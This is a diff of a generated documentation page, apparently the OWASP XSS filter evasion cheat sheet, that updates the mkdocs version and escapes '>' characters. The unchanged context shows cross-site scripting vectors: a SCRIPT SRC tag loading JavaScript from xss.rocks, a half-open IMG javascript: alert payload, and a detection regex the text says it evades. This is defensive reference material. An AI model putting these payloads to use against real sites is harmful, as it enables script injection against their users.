@@ -19,7 +19,7 @@
         <link rel="next" href="XS_Leaks_Cheat_Sheet.html">
       
       <link rel="icon" href="../assets/WebSite_Favicon.png">
-      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.19">
+      <meta name="generator" content="mkdocs-1.5.1, mkdocs-material-9.1.21">
     
     
       
@@ -3431,7 +3431,7 @@
 <p>This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a <code>&lt;/SCRIPT&gt;</code> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.</p>
 <p><code>&lt;SCRIPT SRC=//xss.rocks/.j&gt;</code></p>
 <h3 id="half-open-htmljavascript-xss-vector">Half Open HTML/JavaScript XSS Vector<a class="headerlink" href="#half-open-htmljavascript-xss-vector" title="Permanent link">&para;</a></h3>
-<p>Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close ">" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: <code>/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code> because it doesn't require the end ">". As a side note, this was also affective against a real world XSS filter I came across using an open ended <code>&lt;IFRAME</code> tag instead of an <code>&lt;IMG</code> tag:</p>
+<p>Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close "&gt;" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: <code>/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code> because it doesn't require the end "&gt;". As a side note, this was also affective against a real world XSS filter I came across using an open ended <code>&lt;IFRAME</code> tag instead of an <code>&lt;IMG</code> tag:</p>
 <p><code>&lt;IMG SRC="</code><javascript:alert><code>('XSS')"</code></p>
 <h3 id="double-open-angle-brackets">Double Open Angle Brackets<a class="headerlink" href="#double-open-angle-brackets" title="Permanent link">&para;</a></h3>
 <p>Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:</p>
